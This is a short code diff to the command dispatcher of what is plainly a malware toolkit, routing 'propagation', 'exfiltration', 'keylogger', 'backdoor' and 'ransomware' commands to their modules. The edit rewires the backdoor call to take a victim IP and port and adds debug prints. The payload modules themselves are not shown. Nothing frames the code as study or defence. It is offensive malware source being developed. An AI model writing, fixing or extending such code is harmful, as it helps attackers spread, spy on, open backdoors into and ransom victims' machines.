@@ -52,7 +52,7 @@ def main():
         "propagation": propagation.run,
         "exfiltration": exfiltration.run,
         "keylogger": keylogger.run,
-        "backdoor": backdoor.run,
+        "backdoor": lambda victim_ip, port: backdoor.run(victim_ip, port),
         "instructions": lambda victim_ip: instructions.run(victim_ip),
         "ransomware": ransomware.run,
     }
@@ -78,9 +78,10 @@ def main():
                     instructions.reset_keylog_file()
 
             elif result[0] == "backdoor":
+                print("test1")
                 if len(result) >= 3:
-                    if result[1] == "start":
-                        backdoor.run(attacker_ip=result[2])
+                    print("test2")
+                    backdoor.run(result[1], result[2])
 
             elif result[0] == "ransomware":
                 if result[1] == "encrypt":
